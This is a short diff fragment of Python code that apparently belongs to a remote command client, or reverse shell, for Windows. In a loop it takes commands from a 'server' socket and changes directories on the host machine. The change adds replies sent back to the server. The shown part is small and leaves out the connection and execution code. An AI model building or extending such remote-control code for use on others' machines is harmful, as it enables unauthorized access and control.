@@ -28,10 +28,12 @@ while True:
         if command == "cd ..":
             curDir = cwd.decode("utf-8").split("\\")
             os.chdir("\\".join(curDir[:len(curDir)-1]))
+            server.send(b"COMMAND EXCPETION.")
         elif "cd" in command and command != "cd .." and len(command) > 2:
             newDir = command.split(" ")[1]
             newDir = cwd.decode("utf-8") + "\\" + newDir
             os.chdir(newDir)
+            server.send(b"COMMAND EXCPETION.")
         elif command == "RESPOND NULL":
             continue
         elif command in emptyResponseCommands:
